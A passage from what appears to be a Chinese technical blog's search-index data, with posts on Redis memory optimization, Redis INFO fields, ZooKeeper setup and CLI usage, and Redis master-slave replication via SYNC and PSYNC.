B(encoding:4)-->B1((内部编码类型)) C(lru)-->C1((LRU计时时钟)) D(int refcount)-->D1((引用计数器)) E(void *ptr)-->E1((数据指针)) type：主要包括string，hash，list，set，zset五种类型，可以使用type key 命令查看 encoding：标识redis的内部编码，不同的内部编码占用的内存存在明显差异 lru：记录最后一次访问时间，配合回收策略volatile-lru或者allkeys-lru 使用，可以使用命令object idletime key在不更新lru的情况下查看当前键的空闲空间 refcount：记录对象引用的次数，当refcount=0时，可以安全回收当前对象空间。使用object refcount key命令可以在不修改refcount的情况下获取被引用的次数 *pre：如果值对象时字符串且长度&lt;=39字节的数据， 内部编码是embstr类型，pre直接存储数据， 否则表示指向数据的指针。 在高并发场景中，尽量将字符串长度控制为39字节以内，减少创建redisobject内存分配次数 缩减键值对象 key：key的设计越短越好例如 user:1 –&gt; u:1 value: 如果是序列化对象，应该去除无用属性，并且选择更加高效的序列化工具来降低字节数组大小，如果是json或者xml可以通过Snappy等压缩算法压缩后降低字节数组大小 共享对象池共享对象池中维护了[0-9999]的整数对象，创建大量的整数类型redisObject存在内存开销，内个redisobject内部结构至少占用16字节，甚至超过整数自身的消耗，并且list、set、hash、zset也可以使用共享池对象（ziplist编码无法使用，因为ziplist使用压缩且内存连续的结构，对象共享成本过高）.可以通过object refcount命令查看引用次数 12345678910111213# 返回OKset foo 100# 返回2object refcount foo# 返回Okset bar 100# 返回3object refcount bar# 说明创建foo和bar时均使用的内存池整数对象 LRU回收策略开启时共享池对象无效：因为LRU回收内存时需要获取对象的最后引用时间， 如果使用共享池对象会导致lru对象也共享 为什么只有整数对象池？ 首先整数对象池复用的几率最大，其次对象共享的一个关键操作就是判断相等性，Redis之所以只有整数对象池，是因为整数比较算法时间复杂度为O（1），只保留一万个整数为了防止对象池浪费。如果是字符串判断相等性，时间复杂度变为O（n），特别是长字符串更消耗性能（浮点数在Redis内部使用字符串存储）。对于更复杂的数据结构如hash、list等，相等性判断需要O（n2）。 字符串优化redis字符串sds设计 字符串信息获取O(1) 杜绝缓冲区溢出 减少修改字符串时带来的内存重分配次数 空间预分配 惰性空间释放 同时可以将不必要的字符串对象转化为hash对象存储，例如json，可以通过hash结构，使用hmget，hmset命令部分读取修改，从而降低内存消耗，尽量将字符串长度压缩在 hash-max-ziplist-value设置的大小内，因为ziplist编码远远比hashtable编码节约内存 编码优化编码redis类型与编码关系 Redis为什么对一种数据结构实现多种编码方式？ 主要原因是Redis作者想通过不同编码实现效率和空间的平衡。比如当我们的存储只有10个元素的列表，当使用双向链表数据结构时，必然需要维护大量的内部字段如每个元素需要：前置指针，后置指针，数据指针等，造成空间浪费，如果采用连续内存结构的压缩列表（ziplist），将会节省大量内存，而由于数据长度较小，存取操作时间复杂度即使为O（n2）性能也可满足需求 编码类型转换在Redis写入数据时自动完成，这个转换过程是不可逆的，转换规则只能从小内存编码向大内存编码转换 控制编码类型编码类型转换在Redis写入数据时自动完成，这个转换过程是不可逆的，转换规则只能从小内存编码向大内存编码转换 Redis为什么不支持编码回退？ 主要是数据增删频繁时，数据向压缩编码转换非常消耗CPU，得不偿失。 类型 编码 说明 hash ziplist 满足所有条件： value最大空间(字节)=hash-max-ziplist-value field个数=list-max-ziplist-entries hashtable 满足任意条件： value最大空间(字节)hash-max-ziplist-value field个数list-max-ziplist-entries list ziplist 满足所有条件： value最大空间(字节)=hash-max-ziplist-value field个数=list-max-ziplist-entries linkedlist 满足任意条件： value最大空间(字节)hash-max-ziplist-value field个数list-max-ziplist-entries quicklist 3.2以上版本取消以上两个转换机制 新配置： list-max-zip-size: 表示最大压缩空间或长度 最大空间[-5 —— -1]: 默认-2，表示8K正数 表示最大压缩长度 list-compress-depth: 表示最大压缩深度，默认=0 不压缩 set intset 满足所有条件： 元素必须为正数 集合长度=set-max-intset-entries hashtable 满足任意条件： 元素非正数类型 集合长度set-max-intset-entries zset ziplist 满足所有条件： value最大空间(字节)=hash-max-ziplist-value field个数=list-max-ziplist-entries skiplist 满足任意条件： value最大空间(字节)hash-max-ziplist-value field个数list-max-ziplist-entries 通过上面表格， 可以使用config set 命令设置编码相关参数满足压缩编码的条件。 ziplist编码ziplist 正因为ziplist的性能与长度和元素的个数密切相关，所以提供了{type}-max-ziplist-value、{type}-max-ziplist-entries相关参数来控制ziplist编码转换 针对高性能的场景应该使用ziplist，但是长度不要超过1000，每个元素大小应该控制在512字节内 intset编码intset是集合类型编码的一种,使用时应该保持整数范围一致。防止个别大整数触发集合升级操作，产生内存浪费。 控制键的数量过多的键同样会消耗大量内存，不要仅仅使用get/set将redis当memcached使用，可以降低redis的数据结构外层键的数量。 例如把大量键分组映射到多个hash结构中，降低键的数量。当有100W个键，可以映射到1K个hash中， 每个hash保存1K个元素 hash的field可以用于记录原始key，方便哈希查找 hash的value可以保存原始值对象，确保不要超过hash-max-ziplist-value限制 使用hash优化内存的时候确保使用的时ziplist，如果时hashtable将会消耗更多的内存 同时长度要控制在1000以内，否则存取操作时间复杂度在O(n)到O(n^2)，长列表会消耗大量CPU，得不偿失 ziplist适合存储小对象，对于大对象不但内存优化效果不明显，还会增加命令操作耗时 根据hash长度和长度大小，调整hash-max-ziplist-entries和hash-max-ziplist-value参数，确保hash类型使用ziplist编码。 关于hash键和field键的设计： 1）当键离散度较高时，可以按字符串位截取，把后三位作为哈希的field，之前部分作为哈希的键。如：key=1948480哈希key=group：hash：1948，哈希field=480。 2）当键离散度较低时，可以使用哈希算法打散键，如：使用crc32（key）&amp;10000函数把所有的键映射到“0-9999”整数范围内，哈希field存储键的原始值。 3）尽量减少hash键和field的长度，如使用部分键内容。 使用hash优化带来的问题： 客户端需要预估键的规模并设计hash分组，加重客户端开发成本 hash重构后所有的键无法在使用expire超时和LRU淘汰机制自动删除，需要手动维护 使用ziplist+hash优化keys后，如果想使用超时删除功能，开发人员可以存储每个对象写入的时间，再通过定时任务使用hscan命令扫描数据，找出hash内超时的数据项删除即可。 对于大对象使用hash-ziplist结构控制键数量反而得不偿失 op1=>operation: 默认采用满模式运行 op2=>operation: 每个数据库空间随机检查20个键 cond1=>condition: 是否超过25%的键过期 op3=>operation: 退出 op4=>operation: 循环执行回收逻辑 cond2=>condition: 是否运行超时（大于25ms） op5=>operation: 每次redis事件之前采用快模式运行 (redis触发内部事件之前再次以 快模式运行回收过期键任务，快模 式下超时时间为1毫秒，切2秒内只能 运行1次) op1->op2->cond1 cond1(no)->op3 cond1(yes)->op4 op4->cond2 cond2(yes)->op5 cond2(no)->op3{\"scale\":1,\"line-width\":2,\"line-length\":50,\"text-margin\":10,\"font-size\":12} var code = document.getElementById(\"flowchart-0-code\").value; var options = JSON.parse(decodeURIComponent(document.getElementById(\"flowchart-0-options\").value)); var diagram = flowchart.parse(code); diagram.drawSVG(\"flowchart-0\", options);e=>end: 结束 op1=>operation: 计算当前内存总数 cond1=>condition: 当前使用是否小于maxmemory cond2=>condition: 如果策略为noeviction op2=>operation: 返回写错误 in1=>inputoutput: 计算需要释放的内存 cond3=>condition: 是否遍历完所有数据库 cond4=>condition: 如果策略是 allkeys-lru/allkeys-random op3=>operation: 回收内存目标为所有的数据库键 cond5=>condition: 如果策略是 volatile-lru/volatile-random /volatile-ttl op4=>operation: 回收内存目标为带过期时间的数据 库键 cond6=>condition: 如果使用的是随机策略，那么从 目标字典中随机选出键 op5=>operation: 从选中的键类型随机返回被删除键 cond7=>condition: 如果策略是allkeys-lru/ volatile-lru op6=>operation: 循环随机采样maxmemory_samples次 (默认5次)，返回相对空闲时间最长的键 cond8=>condition: 如果策略是volatile-ttl op7=>operation: 循环随机采样maxmemory_samples次， 返回最近将要过期的键 op8=>operation: 删除选中键 op9=>operation: 发送给从服务器 op1->cond1 cond1(yes,right)->e cond1(no)->cond2 cond2(yes,right)->op2 cond2(no)->in1 in1->cond3 cond3(yes,right)->e cond3(no)->cond4 cond4(yes)->op3->cond6 cond4(no)->cond5 cond5(yes)->op4->cond6 cond6(yes,right)->op5->op8 cond6(no)->cond7 cond7(yes,right)->op6->op8 cond7(no)->cond8 cond8(yes)->op7->op8 op8->op9->cond3{\"scale\":1,\"line-width\":2,\"line-length\":50,\"text-margin\":10,\"font-size\":12} var code = document.getElementById(\"flowchart-1-code\").value; var options = JSON.parse(decodeURIComponent(document.getElementById(\"flowchart-1-options\").value)); var diagram = flowchart.parse(code); diagram.drawSVG(\"flowchart-1\", options);","path":"2019/09/04/redis内存优化/","date":"09-04","excerpt":"内存消耗分类redis内存消耗主要为： 自身内存+对象内存+缓冲内存+内存碎片graph LR subgraph used_memory A(自身内存) B(对象内存) C(缓冲内存) end subgraph used_memory_rss-used_memory D(内存碎片) end","tags":[]},{"title":"redis-5.0.5 info信息详解","text":"info [section]：[section]可以是all、default或者以下选项，不带参数直接调用info时默认使用default。Server 参数 含义 redis_version redis版本 redis_git_sha1 GIT SHA1 redis_git_dirty Git dirty flag redis_build_id redis编译时产生的id redis_mode 运行模式(standalone,cluster) os redis服务器宿主操作系统 arch_bits 架构（32或64位） multiplexing_api redis所使用的事件处理机制 atomicvar_api 原子处理API gcc_version 编译redis时使用的GCC版本 process_id redis进程id run_id redis服务器随机标识（用于sentinel和集群） tcp_port redis监听端口 uptime_in_seconds 已经运行的秒数 uptime_in_days 已经运行的天数 hz 执行后台任务函数被调用的频率 configured_hz 设置的调用频率 lru_clock 以分钟为单位进行自增的时钟，用于 LRU 管理 executable 执行文件位置 config_file 配置文件位置 Clients 参数 含义 connected_clients 已经连接的客户端数量（不包括从属服务器链接的客户端） client_recent_max_input_buffer 当前连接的客户端当中，最长的输出列表 client_recent_max_output_buffer 当前连接的客户端当中，最大输入缓存 blocked_clients 正在等待阻塞命令（BLPOP、BRPOP、BRPOPLPUSH）的客户端的数量 Memory 参数 含义 used_memory 由 Redis 分配器分配的内存总量，以字节（byte）为单位 used_memory_human 以人类可读的格式返回 Redis 分配的内存总量 used_memory_rss 从操作系统的角度，返回 Redis 已分配的内存总量（俗称常驻集大小）。这个值和 top 、 ps 等命令的输出一致 used_memory_rss_human 从操作系统的角度，人类可读的格式返回 Redis 分配的内存总量 used_memory_peak Redis 的内存消耗峰值（以字节为单位） used_memory_peak_human 以人类可读的格式返回 Redis 的内存消耗峰值 used_memory_peak_perc (used_memory/ used_memory_peak) *100% used_memory_overhead Redis为了维护数据集的内部机制所需的内存开销，包括所有客户端输出缓冲区、查询缓冲区、AOF重写缓冲区和主从复制的backlog used_memory_startup Redis服务器启动时消耗的内存 used_memory_dataset used_memory—used_memory_overhead（redis使用的内存-redis内部维护所需内存 = 用户数据内存大小） used_memory_dataset_perc 100%*(used_memory_dataset/(used_memory—used_memory_startup)) （（用户数据内存大小/（使用的内存大小-redis启动的内存大小）= 用户数据大小占redis运行时使用内存比例） total_system_memory 整个系统内存 total_system_memory_human 以人类可读的格式显示整个系统内存 used_memory_lua Lua脚本存储占用的内存 used_memory_lua_human 以人类可读的格式显示Lua脚本存储占用的内存 maxmemory Redis实例的最大内存配置 maxmemory_human 以人类可读的格式显示Redis实例的最大内存配置 maxmemory_policy 当达到maxmemory时的淘汰策略 mem_fragmentation_ratio 内存碎片率（=used_memory_rss/used_memory） mem_allocator 内存分配器（ 在编译时指定的， Redis 所使用的内存分配器。可以是 libc 、 jemalloc 或者 tcmalloc ） active_defrag_running 表示没有活动的defrag任务正在运行，1表示有活动的defrag任务正在运行（defrag:表示内存碎片整理） lazyfree_pending_objects 0表示不存在延迟释放（也有资料翻译未惰性删除）的挂起对象 在理想情况下， used_memory_rss 的值应该只比 used_memory 稍微高一点儿。 当 rss &gt; used ，且两者的值相差较大时，表示存在（内部或外部的）内存碎片。 内存碎片的比率可以通过 mem_fragmentation_ratio 的值看出。 当 used &gt; rss 时，表示 Redis 的部分内存被操作系统换出到交换空间了，在这种情况下，操作可能会产生明显的延迟。 由于Redis无法控制其分配如何映射到内存页，因此高used_memory_rss通常是内存使用激增的结果。 当 Redis 释放内存时，分配器可能会，也可能不会，将内存返还给操作系统。 如果 Redis 释放了内存，却没有将内存返还给操作系统，那么 used_memory 的值可能和操作系统显示的 Redis 内存占用并不一致。 查看 used_memory_peak 的值可以验证这种情况是否发生。 Persistence 参数 含义 loading 服务器是否正在载入持久化文件 rdb_changes_since_last_save 离最近一次成功生成rdb文件，写入命令的个数，即有多少个写入命令没有持久化 rdb_bgsave_in_progress 服务器是否正在创建rdb文件 rdb_last_save_time 离最近一次成功创建rdb文件的时间戳。当前时间戳 - rdb_last_save_time=多少秒未成功生成rdb文件 rdb_last_bgsave_status 最近一次rdb持久化是否成功 rdb_last_bgsave_time_sec 最近一次成功生成rdb文件耗时秒数 rdb_current_bgsave_time_sec 如果服务器正在创建rdb文件，那么这个域记录的就是当前的创建操作已经耗费的秒数 rdb_last_cow_size RDB过程中父进程与子进程相比执行了多少修改(包括读缓冲区，写缓冲区，数据修改等)。 aof_enabled 是否开启了aof aof_rewrite_in_progress 标识aof的rewrite操作是否在进行中 aof_rewrite_scheduled rewrite任务计划，当客户端发送bgrewriteaof指令，如果当前rewrite子进程正在执行，那么将客户端请求的bgrewriteaof变为计划任务，待aof子进程结束后执行rewrite aof_last_rewrite_time_sec 最近一次aof rewrite耗费的时长 aof_current_rewrite_time_sec 如果rewrite操作正在进行，则记录所使用的时间，单位秒 aof_last_bgrewrite_status 上次bgrewriteaof操作的状态 aof_last_write_status 上次aof写入状态 aof_last_cow_size AOF过程中父进程与子进程相比执行了多少修改(包括读缓冲区，写缓冲区，数据修改等)。 如果AOF持久化开启会加上以下状态 参数 含义 aof_current_size AOF 文件目前的大小 aof_base_size 服务器启动时或者 AOF 重写最近一次执行之后，AOF 文件的大小 aof_pending_rewrite 一个标志值，记录了是否有 AOF 重写操作在等待 RDB 文件创建完毕之后执行 aof_buffer_length AOF 缓冲区的大小 aof_rewrite_buffer_length AOF 重写缓冲区的大小 aof_pending_bio_fsync 后台 I/O 队列里面，等待执行的 fsync 调用数量 aof_delayed_fsync 被延迟的 fsync 调用数量 Stats 参数 含义 total_connections_received 新创建连接个数,如果新创建连接过多，过度地创建和销毁连接对性能有影响，说明短连接严重或连接池使用有问题，需调研代码的连接设置 total_commands_processed redis处理的命令数 instantaneous_ops_per_sec redis当前的qps，redis内部较实时的每秒执行的命令数 total_net_input_bytes redis网络入口流量字节数 total_net_output_bytes redis网络出口流量字节数 instantaneous_input_kbps redis网络入口kps instantaneous_output_kbps redis网络出口kps rejected_connections 拒绝的连接个数，redis连接个数达到maxclients限制，拒绝新连接的个数 sync_full 主从完全同步成功次数 sync_partial_ok 主从部分同步成功次数 sync_partial_err 主从部分同步失败次数 expired_keys 运行以来过期的key的数量 expired_stale_perc 过期的比率 expired_time_cap_reached_count 过期计数 evicted_keys 运行以来剔除(超过了maxmemory后)的key的数量 keyspace_hits 命中次数 keyspace_misses 没命中次数 pubsub_channels 当前使用中的频道数量 pubsub_patterns 当前使用的模式的数量 latest_fork_usec 最近一次fork操作阻塞redis进程的耗时数，单位微秒 migrate_cached_sockets 是否已经缓存了到该地址的连接 slave_expires_tracked_keys 从实例到期key数量 active_defrag_hits 主动碎片整理命中次数 active_defrag_misses 主动碎片整理未命中次数 active_defrag_key_hits 主动碎片整理key命中次数 active_defrag_key_misses 主动碎片整理key未命中次数 Replication 参数 含义 role 实例的角色，是master or slave connected_slaves 连接的slave实例个数 master_replid 主实例启动随机字符串 master_replid2 主实例启动随机字符串2 master_repl_offset 主从同步偏移量,与master_replid可被用来标识主实例复制流中的位置。 second_repl_offset 主从同步偏移量2,此值如果和上面的offset相同说明主从一致没延迟 repl_backlog_active 复制积压缓冲区是否开启 repl_backlog_size 复制积压缓冲大小 repl_backlog_first_byte_offset 复制缓冲区里偏移量的大小 repl_backlog_histlen 此值等于 master_repl_offset - repl_backlog_first_byte_offset,该值不会超过repl_backlog_size的大小 如果当前服务器是一个从服务器的话，那么会加上以下域 参数 含义 master_host 主服务器的 IP 地址 master_port 主服务器的 TCP 监听端口号 master_link_status 复制连接当前的状态， up 表示连接正常， down 表示连接断开 master_last_io_seconds_ago 距离最近一次与主服务器进行通信已经过去了多少秒钟 master_sync_in_progress 一个标志值，记录了主服务器是否正在与这个从服务器进行同步 如果同步操作正在进行，那么会加上以下域 参数 含义 master_sync_left_bytes 距离同步完成还缺少多少字节数据 master_sync_last_io_seconds_ago 距离最近一次因为 SYNC 操作而进行 I/O 已经过去了多少秒 如果主从服务器之间的连接处于断线状态，那么这个部分还会加上以下域 参数 含义 master_link_down_since_seconds 主从服务器连接断开了多少秒 对于每个从服务器，会添加以下信息 参数 含义 slaveXXX ID、IP 地址、端口号、连接状态 CPU 参数 含义 used_cpu_sys 将所有redis主进程在核心态所占用的CPU时求和累计起来 used_cpu_user 将所有redis主进程在用户态所占用的CPU时求和累计起来 used_cpu_sys_children 将后台进程在核心态所占用的CPU时求和累计起来 used_cpu_user_children 将后台进程在用户态所占用的CPU时求和累计起来 Commandstats记录了各种不同类型的命令的执行统计信息，比如命令执行的次数、命令耗费的 CPU 时间、执行每个命令耗费的平均 CPU 时间等等。对于每种类型的命令，这个部分都会添加一行以下格式的信 cmdstat_XXX:calls=XXX,usec=XXX,usecpercall=XXX Clustercluster_enabled : 一个标志值，记录集群功能是否已经开启 Keyspace记录了数据库相关的统计信息，比如数据库的键数量、数据库已经被删除的过期键数量等。对于每个数据库，这个部分都会添加一行以下格式的信息 dbXXX:keys=XXX,expires=XXX","path":"2019/08/27/redis-5-0-5 info信息详解/","date":"08-27","excerpt":"info [section]：[section]可以是all、default或者以下选项，不带参数直接调用info时默认使用default。Server 参数 含义 redis_version redis版本 redis_git_sha1 GIT SHA1 redis_git_dirty Git dirty flag redis_build_id redis编译时产生的id redis_mode 运行模式(standalone,cluster) os redis服务器宿主操作系统 arch_bits 架构（32或64位） multiplexing_api redis所使用的事件处理机制 atomicvar_api 原子处理API gcc_version 编译redis时使用的GCC版本 process_id redis进程id run_id redis服务器随机标识（用于sentinel和集群） tcp_port redis监听端口 uptime_in_seconds 已经运行的秒数 uptime_in_days 已经运行的天数 hz 执行后台任务函数被调用的频率 configured_hz 设置的调用频率 lru_clock 以分钟为单位进行自增的时钟，用于 LRU 管理 executable 执行文件位置 config_file 配置文件位置","tags":[]},{"title":"zookeeper安装使用","text":"下载安装文件123456789# 下载$ wget https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.4.14/zookeeper-3.4.14.tar.gz# 解压$ tar -zxvf zookeeper-3.4.14.tar.gz# 删除无用文件$ rm -rf dist-maven/ src/ *.xml *.txt 修改配置文件1234567891011cd confcp zoo_sample.cfg zoo.cfgvi zoo.cfg# 修改文件保存目录dataDir=/root/zkdata# 添加集群信息server.1=172.17.0.2:2888:3888server.2=172.17.0.3:2888:3888server.3=172.17.0.4:2888:3888 创建文件目录123mkdir /root/zkdata# 选举的时候通过id比较来选举， 并且id读取的是文件存放目录下的myid文件echo 1 &gt; /root/zkdata/myid 启动1./zkServer.sh start 选举方式graph LR subgraph 服务器1 A(myid1:1)---B(ip:172.17.0.2) end subgraph 服务器2 C(myid1:2)---D(ip:172.17.0.3) end subgraph 服务器3 F(myid1:3)---E(ip:172.17.0.4) end 服务器1启动， 发现无leader，发起选举， 只有自己，投票自己，少于半数，选举失败 服务器2启动， 发现无leader，发起选举，服务器2自己投自己，服务器1自己投自己，选举失败，均未过半 服务器1服务器2发现无leader， 发起选举， 服务器2 id &gt; 服务器1 id， 服务器1选举服务器2， 服务器2选举服务器2， 超过半数。 选举成功 服务器3启动， 已经有leader， 不进行选举， 自动转为follower 操作命令基本命令12345678910111213141516171819./zkCli.sh# 查看帮助help# 连接指定服务器connect IP:PORT# 创建一个app1的节点，并且内容为this is app1 servers parentcreate /app1 \"this is app1 servers parent\"# 在app1下创建一个server01的节点， 内容为一个ip和权重create /app1/server01 \"192.168.33.5,100\"# 获取app1内容get /app1# 获取app1/server01get /app1/server01 节点节点类型通过create中的可选参数[-e]指定 短暂节点：断开链接后自动删除，可以用于服务器注册，一旦服务器挂掉，zookeeper就会自动删除 持久节点：断开不删除，除非执行删除命令 -e说明是短暂节点， 如果不申明，说明是持久节点 节点形式 短暂节点 短暂节点带序号 持久节点（默认） 持戒节点带序号 带序号说明在同一个节点下建立新的节点，在create命令后带-s新的节点名后面会自动增加一个递增序列id 监听数据监听123get /parent watch# parent节点数据内容被修改的时候会有监听提示， 并且，监听只生效一次 节点监听123ls /parent watch# parent 子节点数量发生变化时进行监听提示， 并且监听只生效一次 配置日志轮循输出第一步：修改$ZOOKEEPER_HOME/conf/log4j.properties文件12345678vi ./conf/log4j.properties# 修改，并且与$ZOOKEEPER_HOME/bin目录下的zkEnv.sh文件中的ZOO_LOG4J_PROP变量的值保持一致zookeeper.root.logger=INFO,ROLLINGFILE # 按照日期每天输出logslog4j.appender.ROLLINGFILE=org.apache.log4j.DailyRollingFileAppender 第二步:修改$ZOOKEEPER_HOME/bin目录下的zkEnv.sh文件 123456vi ./bin/zkEvn.sh#日志输出路径 不需mkdir zookeeper启动时自动创建ZOO_LOG_DIR=\"/opt/zookeeper/logs\"ZOO_LOG4J_PROP=\"INFO,ROLLINGFILE\" 第三步：修改$ZOOKEEPER_HOME/bin目录下的zkServer.sh文件12345vi ./bin/zkServer.sh# 输出日志文件名_ZOO_DAEMON_OUT=$ZOO_LOG_DIR/zookeeper.log","path":"2019/08/26/zookeeper安装使用/","date":"08-26","excerpt":"下载安装文件123456789# 下载$ wget https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.4.14/zookeeper-3.4.14.tar.gz# 解压$ tar -zxvf zookeeper-3.4.14.tar.gz# 删除无用文件$ rm -rf dist-maven/ src/ *.xml *.txt","tags":[]},{"title":"redis主从复制","text":"在redis中可以通过slaveof命令让一个服务器去复制另一个服务器，其中被复制的服务器叫做主服务器，对主服务器进行复制的叫做从服务器。graph LR A[从服务器] -->|复制| B(主服务器) 旧版复制的实现redis的复制分为同步/命令传播两个操作 同步操作用于将从服务器的数据库状态更新至主服务器当前所处的数据库状态 命令传播操作则用于在主服务器的数据库状态被修改，导致主从服务器的数据库状态出现不一致时让主从服务器的数据库重新回到一致状态 同步当客户端向从服务器发送slaveof命令，要求从服务器复制主服务器时，从服务器首先需要执行同步操作，也就是将从服务器的数据库状态更新至主服务器当前所处的数据库状态。 同步操作需要sync命令来完成 从服务器向主服务器发送sync命令 收到sync命令的主服务器执行BGSAVE命令， 在后台生成一个RDB文件，并使用一个缓冲区记录现在开始所执行的所有命令 当主服务器的BGSAVE命令执行完毕时，主服务器会将生成的RDB文件发送给从服务器，从服务器接收并载入这个RDB文件，将自己的数据库状态更新至主服务器指定BGSAVE命令时的状态。 主服务器将缓冲区此期间记录的所有命令发送给从服务器，从服务器执行这些数据更新命令，将自己的数据库状态更新至主服务器数据库当前所处的状态 graph LR; B(从服务器)-->|发送SYNC命令|A(主服务器); A-->|发送RDB文件|B A-->|发送缓冲区保存的所有数据更改命令|B 命令传播同步命令执行完毕后，主从服务器处于一致状态。 当主服务器执行数据修改命令时，一致状态将会被打破，这个时候主从的数据不可能一致，所以，主服务器需要将导致数据不一致的命令发送给从服务器，从服务器通过执行这条命令，使数据重新达到一致。 graph LR A(客户端)-->|del key|B(主服务器) B-->|del b|C(从服务器) 复制功能缺陷复制可以分为两种情况 初次复制： 从服务器以前没有复制过任何主服务器， 或者从服务器当前要复制的主服务器与上一次复制的主服务器不同 断线后重复制：处于命令传播阶段的主从服务器因为某种原因断开复制，但从服务器通过自动重连重新连接上了主服务器，并且继续复制主服务器 在旧版复制中， 初次复制没有问题， 但是断线后重复制有很大重复性操作 sequenceDiagram 从服务器 -> 主服务器: 同步状态 客户端 ->> 主服务器: 发送set n命令 主服务器 ->> 从服务器: 传播set n命令 从服务器 ->> 主服务器: 断开链接 客户端 ->> 主服务器: 发送set n+1命令 从服务器 ->> 主服务器: 尝试链接 客户端 ->> 主服务器: 发送set n+2命令 从服务器 ->> 主服务器: 重新链接成功 从服务器 ->> 主服务器: sync命令 主服务器 ->> 从服务器: 执行同步操作 客户端 ->> 主服务器: 发送set n+3命令 从服务器 ->> 主服务器: 接收同步期间的修改命令 主服务器 -> 从服务器: 同步状态 上图中可以清晰看到， 断线重连后，同步操作这一步实际上并不是非做不可。 从服务器想要将自己更新至主服务器当前所处的状态，真正需要的是主从服务器链接中断期间，主服务器新添加的n+1, n+2两个键的数据。 所以， 主服务器执行同步操作， 将1——n+2 都打包成RDB发送给从服务器是不必要的. 一般来说，主服务器在断线期间执行修改命令会比整个数据库的数据量要少得多，在这种情况下，为了让从服务器补足一小部分缺失的数据，却要让主服务器重新执行一次SYNC命令， 这种做法是非常低效的。 新版复制实现为了解决旧版复制功能在处理断线重复制的低效问题，Redis使用PSYNC命令代替SYNC命令来执行复制时的同步操作 PSYNC具有完整重同步和部分重同步 完整重同步： 用于初次复制情况，执行步骤和sycn命令基本一样， 都是通过让主服务器创建并发送RDB文件，以及向从服务器发送保存在缓冲区里面的修改命令进行同步 部分重同步：用于断线后重复制情况，当从服务器在断线后重新连接上主服务器时，如果条件允许，主服务器可以将主从服务器断开期间执行的数据修改命令发送给从服务器，从服务器只要接受并执行这些命令，就可以将数据库更新至主服务器当前所处的数据库状态 sequenceDiagram 从服务器 -> 主服务器: 同步状态 客户端 ->> 主服务器: 发送set n命令 主服务器 ->> 从服务器: 传播set n命令 从服务器 ->> 主服务器: 断开链接 客户端 ->> 主服务器: 发送set n+1命令 从服务器 ->> 主服务器: 尝试链接 客户端 ->> 主服务器: 发送set n+2命令 从服务器 ->> 主服务器: 重新链接成功 从服务器 ->> 主服务器: 发送psync命令 主服务器 ->> 从服务器: 向从服务器返回+continue回复，表示执行部分重同步 从服务器 -> 从服务器: 接收+continue，准备执行部分重同步 主服务器 ->> 从服务器: 发送set n+1、n+2命令 从服务器 -> 从服务器: 接收并执行传过来的两个set命令 主服务器 -> 从服务器: 再次恢复同步 从上可以看出， psync相比较sync命令在断线重复制时所需资源要少得多，完成同步的速度也快得多，整个过程中， 不需要处理已经重复的数据。 部分重同步的实现部分重同步主要由三个部分构成： 主服务器的复制偏移量、从服务器的复制偏移量 主服务器的复制挤压缓冲区 服务器的运行id 复制偏移量主从服务器分别会维护一个复制偏移量 主服务器每次向从服务器传播N个字节数据时，就将自己的复制偏移量的值加N 从服务器每次接收到主服务器传播来的N个字节数据时，就将自己的复制偏移量的值加N graph LR A(客户端) -->|发送set命令 33字节| B(主服务器,目前10086字节) B ---|复制偏移量加33, 复制偏移量为10119| B B -->|传播33字节数据| C(从服务器1,目前10068字节) C ---|复制偏移量加33, 复制偏移量为10119| C B -->|传播33字节数据| D(从服务器2,目前10068字节) D ---|复制偏移量加33, 复制偏移量为10119| D B -->|传播33字节数据| E(从服务器3,目前10068字节) E ---|复制偏移量加33, 复制偏移量为10119| E 通过确认主从的复制偏移量就可以确认是否处于一致状态 如果传播时从服务器1断线，那么传播就只有从服务器2，从服务器3能够接收，在此之后就只有从服务器1复制偏移量为10086， 而其他都是10119， 待从服务器1重新连接后是执行部分重同步还是完全重同步需要涉及复制积压缓冲区 graph LR A(客户端) -->|发送set命令 33字节| B(主服务器,目前10086字节) B ---|复制偏移量加33, 复制偏移量为10119| B B -.-> |断线| C(从服务器1,目前10068字节) B -->|传播33字节数据| D(从服务器2,目前10068字节) D ---|复制偏移量加33, 复制偏移量为10119| D B -->|传播33字节数据| E(从服务器3,目前10068字节) E ---|复制偏移量加33, 复制偏移量为10119| E 复制积压缓冲区复制积压缓冲区是由主服务器维护的一个固定长度先进先出队列，默认大小为1MB， 当主服务器进行命令传播时，它不仅仅会将写命令发送给所有从服务器，还会将命令入队到复制积压缓冲区里面 graph TB subgraph 主服务器 A(命令传播程序) -->|将写命令放入队列| B(复制积压缓冲区) end A -->|发送写命令| C(从服务器A) A -->|发送写命令| D(从服务器B) 当从服务器重新连上主服务器后，会通过psync命令将自己的复制偏移量offset发送给主服务器，主服务器会根据这个复制偏移量来决定对从服务器执行何种同步操作 如果offset偏移量之后的数据任然存在于复制积压缓冲区里面，那么主服务器将对从服务器执行部分重同步操作 如果offset偏移量之后的数据已经不存在于复制积压缓冲区，那么主服务器将对从服务器执行完整同步操作 回到之前的例子： 从服务器1重新连接后，通过psync命令报告自己的复制偏移量10086 主服务器将检查偏移量10086之后的数据是否存在于复制积压缓冲区里面，发现这些数据任然存在，于是主服务器向从服务器发送+continue回复， 表示数据同步将以部分重同步模式进行 接着主服务器会将复制积压缓冲区10086偏移量之后的所有数据（10087-10119）都发送给从服务器1 从服务器只要接收这33字节的缺失数据，就可以回到与主服务器一直状态 服务器运行id除了复制偏移量和复制积压缓冲区外，实现部分重同步还需要用到服务器运行ID 每个redis服务器都会有自己的运行ID 运行ID在服务器启动时自动生成，由60个随机的十六进制字符组成 当从服务器对主服务器初次复制时，主服务器会将自己运行的id传送给从服务器，而从服务器则会将这个运行id保存起来， 从服务器断线重连时，从服务器将向当前连接的主服务器发送之前保存的ID 如果保存的ID和主服务器相同，说明断线前复制的就是当前主服务器，可以尝试执行部分重同步 如果ID不同， 说明从服务器断线前复制的主服务器并不是当前这台，应该进行完全同步操作 PSYNC命令实现调用方法 如果没有复制过任何主服务器，或者之前执行了slaveof no one ,那么这个从服务器在开始一次新的复制时要向主服务器发送PSYNC ? -1 命令， 主动请求主服务器完全同步操作 相反， 如果已经进行过复制操作，那么从服务器在开始时要发送PSYNC &lt;runid&gt; &lt;offset&gt;， 其中runid是上次复制的主服务器id，offset时目前复制偏移量， 接收到这个命令的主服务器会通过这两个参数来判断改对从服务器执行哪种同步操作 三种回复： 如果执行完整同步操作：回复+FULLRESYNC &lt;runid&gt; 